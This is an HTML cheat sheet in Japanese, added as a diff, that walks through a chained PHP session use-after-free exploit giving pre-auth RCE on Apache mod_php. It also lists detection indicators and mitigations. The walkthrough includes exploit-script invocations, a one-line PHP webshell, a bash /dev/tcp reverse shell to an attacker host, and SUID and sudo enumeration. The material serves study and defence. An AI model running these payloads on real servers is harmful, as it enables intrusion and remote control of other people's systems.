@@ -1,0 +1,346 @@
+<!doctype html>
+<!-- ============================================================
+     php2shell — CVE-2026-109618 / 109619 Walk-through
+     refs/sheets/php2shell.html
+     ============================================================ -->
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PHP2Shell — d0me</title>
+<meta name="description" content="CVE-2026-109618 / CVE-2026-109619 — PHP session handler UAF を連鎖させた Apache mod_php 上の pre-auth RCE walk-through">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>PHP2Shell</div>
+    <h1>PHP2Shell</h1>
+    <p class="lede">CVE-2026-109618 / CVE-2026-109619 — PHP session handler の use-after-free を連鎖させた Apache mod_php 上の pre-auth RCE walk-through.<span class="jp">OOM bailout の不完全なクリーンアップからヒープリーク → ROP → RCE に至る攻略手順と検知・緩和策。</span></p>
+  </div>
+</section>
+
+<section class="attack-flow">
+  <div class="wrap">
+    <div class="flow-head">
+      <h2 class="flow-title">PHP2Shell — CVE-2026-109618 / 109619</h2>
+      <p class="flow-sub">PHP session handler の 2 件の use-after-free を連鎖させ、Apache mod_php 上で認証なし RCE に至る攻略チェーン。</p>
+    </div>
+    <div class="flow-chain">
+      <div class="flow-phase"><span class="flow-num">0</span><strong>Worker Pinning</strong><span class="flow-jp">プール飽和</span></div>
+      <div class="flow-phase"><span class="flow-num">1</span><strong>Info Disclosure</strong><span class="flow-jp">ASLR バイパス</span></div>
+      <div class="flow-phase"><span class="flow-num">2</span><strong>RCE</strong><span class="flow-jp">ROP → system()</span></div>
+    </div>
+  </div>
+</section>
+
+<div class="wrap">
+<div class="sheet-layout">
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#s01">01 概要</a></li>
+      <li><a href="#s02">02 偵察</a></li>
+      <li><a href="#s03">03 Stage 0 — Worker Pinning</a></li>
+      <li><a href="#s04">04 Stage 1 — 情報リーク</a></li>
+      <li><a href="#s05">05 Stage 2 — RCE</a></li>
+      <li><a href="#s06">06 Post-Exploitation</a></li>
+      <li><a href="#s07">07 検知・緩和</a></li>
+      <li><a href="#ref">08 参照</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <!-- ===== s01: 概要 ===== -->
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>概要<span class="jp">Overview</span></h2>
+
+      <table>
+        <tr><th>CVE</th><td>CVE-2026-109618 (incomplete HashTable bucket → forged object → ROP)<br>CVE-2026-109619 (stale PS(id) cross-request UAF → heap leak)</td></tr>
+        <tr><th>CVSS v4.0</th><td>9.2 (Critical) — 両方とも</td></tr>
+        <tr><th>影響範囲</th><td>PHP 5.4 (2012) 以降すべて。Apache mod_php (prefork) が最高リスク</td></tr>
+        <tr><th>修正版</th><td>8.2.35 / 8.3.36 / 8.4.27 / 8.5.12</td></tr>
+        <tr><th>開示</th><td>2026-10-21。CISA KEV 追加 2026-10-26</td></tr>
+        <tr><th>EDB</th><td>52704 (OffSec verified, 2026-10-22 公開)</td></tr>
+        <tr><th>GHSA</th><td>GHSA-w8hw-w9fx-j79w / GHSA-6wmf-4rv5-p3rp</td></tr>
+        <tr><th>前提条件</th><td>認証不要。<code>session.upload_progress.enabled=On</code> (既定有効)</td></tr>
+        <tr><th>権限</th><td>www-data (web worker 権限)</td></tr>
+      </table>
+
+      <p>2 件は単独では不完全: CVE-2026-109619 がヒープリークで ASLR をバイパスし、CVE-2026-109618 が incomplete bucket からオブジェクト偽造 → ROP → <code>zif_system()</code> で RCE に至る。</p>
+      <p><code>session.upload_progress</code> がアプリケーションコードの<strong>実行前</strong>に動作するため、アプリ側の WAF・認証・CSRF チェックはすべてバイパスされる。</p>
+    </section>
+
+    <!-- ===== s02: 偵察 ===== -->
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>偵察<span class="jp">Reconnaissance</span></h2>
+
+      <h3>ポートスキャン</h3>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># フルポートスキャン + サービス検出</span>
+nmap -sC -sV -p- <span class="v">&lt;TARGET&gt;</span> -oN nmap_full.txt</code></pre></div>
+
+      <p>確認ポイント:</p>
+      <ul>
+        <li><code>Apache/2.4.x</code> + <code>X-Powered-By: PHP/8.x.x</code> ヘッダ</li>
+        <li>PHP バージョンが 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 より前なら脆弱</li>
+        <li>mod_php (prefork) かどうかは <code>Server</code> ヘッダの <code>PHP/x.x.x</code> 表記で推定 (FPM は通常ヘッダに出ない)</li>
+      </ul>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># PHP バージョン + モジュール構成の確認</span>
+curl -sI http://<span class="v">&lt;TARGET&gt;</span>/ | grep -iE 'server|x-powered-by|set-cookie'</code></pre></div>
+
+      <p><code>Set-Cookie: PHPSESSID=</code> が返ればセッションハンドラが動作しており、<code>session.upload_progress</code> が有効である可能性が高い。</p>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li><code>expose_php = Off</code> / <code>ServerTokens Prod</code> でバージョン情報を隠蔽 (フィンガープリント対策)</li>
+          <li>ただし攻撃者はエラーページやレスポンスタイミングからバージョンを推定できるため、根本対策にはならない</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== s03: Stage 0 — Worker Pinning ===== -->
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>Stage 0 — Worker Pinning<span class="jp">プール飽和</span></h2>
+
+      <p>Apache prefork の MaxRequestWorkers (既定 150) 分のコネクションを張って全 worker を占有し、攻撃リクエストが同一 worker に到達するようルーティングを制御する。</p>
+
+      <h3>手順</h3>
+      <ol>
+        <li><strong>Pool Scrub</strong> — 全 worker を一巡させて初期状態にリセット</li>
+        <li><strong>Capacity Probe</strong> — 並列コネクション数を増やしながら MaxRequestWorkers を特定</li>
+        <li><strong>Parallel Repin</strong> — N-1 本の keep-alive コネクションで worker を占有し、残り 1 本を攻撃用スロットとして確保</li>
+      </ol>
+
+      <p>exploit スクリプト (EDB-52704) はこの 3 フェーズを自動実行する。手動で確認する場合:</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># MaxRequestWorkers の推定 (応答タイムアウトが発生するコネクション数 ≈ MaxRequestWorkers)</span>
+<span class="k">for</span> i <span class="k">in</span> $(seq 100 10 200); <span class="k">do</span>
+  echo -n "$i conns: "
+  timeout 5 ab -n $i -c $i -k http://<span class="v">&lt;TARGET&gt;</span>/ 2>&amp;1 | grep 'Complete requests'
+<span class="k">done</span></code></pre></div>
+
+      <div class="note warn"><span class="lbl">注意</span>
+        攻撃中は <strong>~150 本の同時接続</strong>が維持される。IDS/IPS のコネクション閾値に確実にかかるため、検知リスクが最も高いフェーズ。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>単一 IP からの同時接続数を制限 (<code>mod_limitipconn</code> / iptables <code>connlimit</code>)</li>
+          <li>ネットワークモニタリングで単一ソースからの 100+ 同時接続スパイクをアラート</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== s04: Stage 1 — 情報リーク ===== -->
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>Stage 1 — 情報リーク<span class="jp">ASLR Bypass</span></h2>
+
+      <p>OOM を故意に発生させ、<code>zend_bailout()</code> (<code>longjmp()</code>) によるスタック巻き戻しで per-request 状態のクリーンアップをスキップ。次リクエストが同一 worker に到達すると、stale な <code>PS(id)</code> がフリー済みヒープを参照し、overlong <code>Set-Cookie: PHPSESSID=</code> として漏洩する。</p>
+
+      <h3>ヒープ増幅メカニズム</h3>
+      <p>multipart POST の <code>$_FILES</code> に空ファイル名のネストされたフィールドを大量に含めると、約 <strong>390 倍のヒープ増幅</strong>が発生する。1 MB のリクエストボディで <code>memory_limit</code> (既定 128 MB) を超過させられる。</p>
+
+      <h3>ポインタ抽出</h3>
+      <p>漏洩した cookie (通常 100 KB+) を URL デコードし、8 バイト単位でスキャンしてユーザ空間ポインタレンジ内の値の出現頻度を集計する。最頻出ポインタから libphp ベースアドレスを特定し、既知の delta で Zend ヒープベースを算出する。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># exploit スクリプトの disclosure フェーズ (EDB-52704)</span>
+python3 exploit.py --target http://<span class="v">&lt;TARGET&gt;</span>/ --mode disclose</code></pre></div>
+
+      <p>成功時の出力例:</p>
+      <ul>
+        <li><code>candidates=N</code> (N &gt; 0) — ポインタ候補が見つかった</li>
+        <li><code>libphp_base=0x7f...</code> — libphp のベースアドレス</li>
+        <li><code>heap_base=0x7f...</code> — Zend ヒープのベースアドレス</li>
+      </ul>
+
+      <div class="note"><span class="lbl">memo</span>
+        <code>candidates=0</code> は正常サイズの cookie が返った場合 (確率的失敗)。リトライで解決する。overlong cookie (257 文字超) が返れば成功。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>WAF ルール: <code>PHPSESSID</code> の長さが 257 文字超なら即時ブロック — <strong>最も高信頼度の単一指標</strong></li>
+          <li><code>session.upload_progress.enabled = Off</code> (<code>php.ini</code> で設定、<code>.htaccess</code> / <code>ini_set()</code> では間に合わない)</li>
+          <li><code>memory_limit = -1</code> + cgroup <code>MemoryMax</code> で OOM bailout パスを除去 (<code>RLIMIT_AS</code> は逆効果 — mmap 失敗が同一の bailout を発火させる)</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== s05: Stage 2 — RCE ===== -->
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>Stage 2 — RCE<span class="jp">ROP → system()</span></h2>
+
+      <p>Stage 1 で取得したアドレスを使い、128 MB multipart POST で 2 度目の OOM を発生させる。<code>_zend_hash_str_add_or_update_i()</code> の途中で OOM が発生すると、incomplete bucket がハッシュテーブルに残る。配列デストラクタがこの不完全 bucket を走査する際、攻撃者が制御するメモリを zval → object → handler table として解釈し、関数ポインタをハイジャックする。</p>
+
+      <h3>ROP チェーン</h3>
+      <ol>
+        <li><strong>Stack pivot</strong> — <code>jump_fcontext+0x2e</code> でスタックをヒープ上の制御領域に切り替え</li>
+        <li><strong>pop rdi</strong> — コマンド文字列のアドレスを第 1 引数にロード</li>
+        <li><strong>pop rsi</strong> — return value ポインタを設定</li>
+        <li><strong>ret</strong> → <code>zif_system()</code> — PHP の <code>system()</code> ラッパを呼び出し</li>
+      </ol>
+
+      <h3>コマンド長制限</h3>
+      <p>キャリア構造体の固定サイズにより、<strong>最大 47 文字</strong> (null 終端を含め 48 バイト)。webshell の書き込みが現実的な最初のコマンド。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># 既定コマンドで実行 (id > /var/www/html/proof.txt)</span>
+python3 exploit.py --target http://<span class="v">&lt;TARGET&gt;</span>/
+
+<span class="c"># カスタムコマンドで webshell を設置 (47 文字以内)</span>
+python3 exploit.py --target http://<span class="v">&lt;TARGET&gt;</span>/ \
+  --command 'echo "&lt;?=\`\$_GET[c]\`?&gt;" > /var/www/html/s.php'</code></pre></div>
+
+      <p>レスポンスコードの解釈:</p>
+      <ul>
+        <li><strong>response=0</strong> (worker crash) — ROP チェーンが発火した可能性が高い (~75% 成功率)</li>
+        <li><strong>response=192</strong> (500 error) — ROP チェーンが発火しなかった可能性が高い → リトライ</li>
+      </ul>
+
+      <div class="note warn"><span class="lbl">注意</span>
+        カスタムコマンドの場合、exploit は <code>proof_url=None</code> を返すため、実行成否を自動検証しない ("execution unverified" は仕様通りの動作)。手動で webshell の存在を確認する。
+      </div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>ファイルアップロードを受け付けないルートへの <code>multipart/form-data</code> をブロック</li>
+          <li>PHP-FPM: <code>pm.max_requests = 1</code> で worker の cross-request 状態を排除 (パフォーマンスコストあり)</li>
+          <li>EDR / auditd: httpd / php-fpm から <code>sh</code>, <code>bash</code>, <code>curl</code>, <code>wget</code> の子プロセス生成を監視</li>
+          <li>SIGSEGV (exit code 139) の worker クラッシュスパイクを監視</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== s06: Post-Exploitation ===== -->
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Post-Exploitation<span class="jp">フラグ取得</span></h2>
+
+      <p>RCE が成功し webshell が設置されたら、47 文字制限なしにコマンドを実行できる。</p>
+
+      <h3>Webshell 構造</h3>
+      <p><code>&lt;?=`$_GET[c]`?&gt;</code> — PHP short echo tag + backtick 演算子。GET パラメータ <code>c</code> の値をシェルコマンドとして実行し、stdout を返す。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># webshell の存在確認 + id</span>
+curl -s "http://<span class="v">&lt;TARGET&gt;</span>/s.php?c=id"
+<span class="c"># → uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="c"># フラグ探索</span>
+curl -s "http://<span class="v">&lt;TARGET&gt;</span>/s.php?c=find+/+-name+proof.txt+2>/dev/null"
+
+<span class="c"># フラグ取得</span>
+curl -s "http://<span class="v">&lt;TARGET&gt;</span>/s.php?c=cat+/var/www/proof.txt"</code></pre></div>
+
+      <h3>権限昇格の要否</h3>
+      <p>www-data 権限で十分なケースが多い。<code>proof.txt</code> が <code>/root/</code> 配下にある場合は権限昇格が必要だが、<code>/var/www/</code> 配下にあれば www-data で読める。</p>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># SUID バイナリの列挙 (privesc が必要な場合)</span>
+curl -s "http://<span class="v">&lt;TARGET&gt;</span>/s.php?c=find+/+-perm+-4000+-type+f+2>/dev/null"
+
+<span class="c"># sudo 権限の確認</span>
+curl -s "http://<span class="v">&lt;TARGET&gt;</span>/s.php?c=sudo+-l+2>&amp;1"
+
+<span class="c"># リバースシェルへの昇格 (対話的操作が必要な場合)</span>
+curl -s "http://<span class="v">&lt;TARGET&gt;</span>/s.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/<span class="v">&lt;LHOST&gt;</span>/<span class="v">&lt;LPORT&gt;</span>+0>%261'"</code></pre></div>
+
+      <div class="defense"><span class="lbl">防御 / countermeasures</span>
+        <ul>
+          <li>Web root (<code>/var/www/html/</code>) のファイル整合性監視 (新規 <code>.php</code> ファイルの出現をアラート)</li>
+          <li>Apache を read-only filesystem で実行 (コンテナ環境の場合)</li>
+          <li><code>open_basedir</code> / <code>disable_functions</code> で <code>system()</code>, <code>exec()</code>, <code>passthru()</code>, <code>shell_exec()</code> を制限</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== s07: 検知・緩和 ===== -->
+    <section id="s07" class="reveal">
+      <h2><span class="num">07</span>検知・緩和<span class="jp">Detection &amp; Mitigation</span></h2>
+
+      <h3>検知指標</h3>
+      <table>
+        <tr><th>レイヤ</th><th>指標</th><th>信頼度</th></tr>
+        <tr><td>Network</td><td>単一 IP からの ~150 同時接続スパイク</td><td>高</td></tr>
+        <tr><td>HTTP / WAF</td><td><code>PHPSESSID</code> &gt; 257 文字 (URL エンコードされたバイナリデータ)</td><td>高</td></tr>
+        <tr><td>Access Log</td><td>500 / 200 の急速な交互出現 + 大きな Content-Length の POST</td><td>中</td></tr>
+        <tr><td>Host / EDR</td><td>httpd / php-fpm から sh/bash/curl の子プロセス生成</td><td>高</td></tr>
+        <tr><td>Host</td><td>SIGSEGV (exit 139) の worker クラッシュスパイク</td><td>中</td></tr>
+        <tr><td>PHP Log</td><td><code>memory_limit</code> 超過エラーの急増</td><td>低</td></tr>
+      </table>
+
+      <div class="note"><span class="lbl">memo</span>
+        PHP の <code>display_errors</code> / <code>error_reporting</code> / <code>log_errors</code> はメモリリーク・RCE に対して<strong>防御効果ゼロ</strong>。use-after-free はエラー報告レイヤの下で発生する。
+      </div>
+
+      <h3>緩和策の優先順位</h3>
+      <table>
+        <tr><th>対策</th><th>効果</th><th>副作用</th></tr>
+        <tr><td><strong>パッチ適用</strong> (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12)</td><td>根本修正</td><td>なし</td></tr>
+        <tr><td><code>session.upload_progress.enabled = Off</code></td><td>エントリポイント除去</td><td>upload progress 機能喪失</td></tr>
+        <tr><td><code>memory_limit = -1</code> + cgroup <code>MemoryMax</code></td><td>OOM bailout パス除去</td><td>cgroup 設定が必要</td></tr>
+        <tr><td>PHP-FPM <code>pm.max_requests = 1</code></td><td>cross-request 状態排除</td><td>パフォーマンスコスト</td></tr>
+        <tr><td><code>multipart/form-data</code> ブロック</td><td>トリガメカニズム排除</td><td>正規アップロード不可</td></tr>
+        <tr><td>PHP 8.5: <code>fatal_error_backtraces = 0</code></td><td>追加 stale-state ベクタ除去</td><td>デバッグ情報喪失</td></tr>
+      </table>
+
+      <div class="note warn"><span class="lbl">注意</span>
+        <code>RLIMIT_AS</code> / <code>ulimit -v</code> は<strong>逆効果</strong>。<code>mmap()</code> 失敗が同一の OOM bailout パスを発火させるため、攻撃面を拡大する。<code>MemoryMax</code> (cgroup) を使う。
+      </div>
+
+      <div class="takeaway"><span class="lbl">要点 / key takeaways</span>
+        <ul>
+          <li>パッチが唯一の根本修正。interim 対策はパッチ適用までの時間稼ぎ</li>
+          <li>最強の単一検知指標は overlong PHPSESSID (257 文字超)</li>
+          <li>mod_php + prefork が最高リスク — FPM は worker 分離 + <code>max_requests=1</code> で大幅に緩和可能</li>
+          <li>攻撃はアプリケーションコードの実行前に完了 — アプリ側の防御はすべて無効</li>
+          <li><code>RLIMIT_AS</code> は緩和策ではなく攻撃面の拡大 — cgroup <code>MemoryMax</code> を使う</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== ref ===== -->
+    <section id="ref" class="reveal">
+      <h2><span class="num">08</span>参照<span class="jp">References</span></h2>
+      <ul>
+        <li>Rapid7 — CVE-2026-109618 / CVE-2026-109619 技術解析: <a href="https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php/" target="_blank" rel="noopener">rapid7.com</a></li>
+        <li>Sansec — PHP2Shell 概要: <a href="https://sansec.io/research/php2shell" target="_blank" rel="noopener">sansec.io</a></li>
+        <li>Google Cloud — 検知・緩和ガイド: <a href="https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619" target="_blank" rel="noopener">cloud.google.com</a></li>
+        <li>Exploit-DB — EDB-52704 (OffSec verified): <a href="https://www.exploit-db.com/exploits/52704" target="_blank" rel="noopener">exploit-db.com</a></li>
+        <li>PHP GHSA — GHSA-w8hw-w9fx-j79w: <a href="https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w" target="_blank" rel="noopener">github.com</a></li>
+        <li>PHP GHSA — GHSA-6wmf-4rv5-p3rp: <a href="https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp" target="_blank" rel="noopener">github.com</a></li>
+        <li>MITRE ATT&CK — T1190 Exploit Public-Facing Application: <a href="https://attack.mitre.org/techniques/T1190/" target="_blank" rel="noopener">attack.mitre.org</a></li>
+        <li>d0me blog — PHP2Shell: From OOM Bailout to Pre-Auth RCE: <a href="/2026/11/07/php2shell-oom-rce/" target="_blank" rel="noopener">blog</a></li>
+      </ul>
+    </section>
+
+  </article>
+</div>
+</div>
+</main>
+
+<footer class="foot">
+  <div class="wrap">
+    <div class="sig"><span class="mini-hanko" aria-hidden="true">d0</span><span class="fmeta"><b data-handle>d0me</b> · PHP2Shell</span></div>
+    <div class="flinks"><a href="../all.html">索引</a><a href="#" data-gh-url>GitHub</a></div>
+    <span class="fmeta">© <span data-year>2026</span> · <span class="mono">CC BY-NC-SA 4.0</span></span>
+  </div>
+</footer>
+
+<script src="../content.js"></script>
+<script src="../assets/js/sheet.js"></script>
+</body>
+</html>
